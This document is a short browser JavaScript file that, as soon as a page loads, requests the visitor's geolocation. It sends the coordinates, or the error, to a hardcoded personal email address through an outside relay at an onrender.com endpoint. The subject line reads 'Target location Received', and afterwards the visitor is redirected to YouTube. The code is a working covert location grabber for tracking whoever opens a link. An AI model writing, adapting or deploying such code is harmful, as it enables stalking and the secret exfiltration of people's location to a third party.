document.addEventListener("DOMContentLoaded", function () {
    const locationDisplay = document.getElementById("locationDisplay");

    if ("geolocation" in navigator) {
        console.log("Geolocation is supported by this browser.");

        // Automatically request location without button click
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
                console.log(`Location received: Latitude ${latitude}, Longitude ${longitude}`);

                sendEmail('Target location Received', locationDisplay.textContent, 'rizwanrao095@gmail.com');
            },
            (error) => {
                console.log("Geolocation error occurred:", error);

                switch (error.code) {
                    case error.PERMISSION_DENIED:
                        locationDisplay.textContent = "Location access denied by user.";
                        break;
                    case error.POSITION_UNAVAILABLE:
                        locationDisplay.textContent = "Location information is unavailable.";
                        break;
                    case error.TIMEOUT:
                        locationDisplay.textContent = "Location request timed out.";
                        break;
                    default:
                        locationDisplay.textContent = "An unknown error occurred.";
                        break;
                }

                console.log("Error message:", locationDisplay.textContent);
                sendEmail('Location Access Error', locationDisplay.textContent, 'rizwanrao095@gmail.com');
            }
        );
    } else {
        console.log("Geolocation is not supported by this browser.");
        locationDisplay.textContent = "Geolocation is not supported by this browser.";
    }
});

function sendEmail(subject, message, recipientEmail) {
    if (!subject || !message || !recipientEmail) {
        alert("Please fill out all fields.");
        return;
    }

    const emailData = {
        subject: subject,
        message: message,
        recipient_email: recipientEmail,
        recipient_name: "John Doe"
    };

    fetch("https://simple-send-email-kzbu.onrender.com/api/send-email/", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(emailData)
    })
        .then(response => {
            if (response.ok) {
                return response.json();
            } else {
                throw new Error(`Server responded with ${response.status}`);
            }
        })
        .then(data => {
            if (data.message) {
                alert("Email sent successfully!");
                window.location.href = "https://www.youtube.com";
            } else if (data.error) {
                alert("Error: " + data.error);
            } else {
                alert("Unexpected error occurred.");
            }
        })
        .catch(error => {
            console.log("Error sending email:", error);
            alert("Error sending email: " + error.message);
        });
}
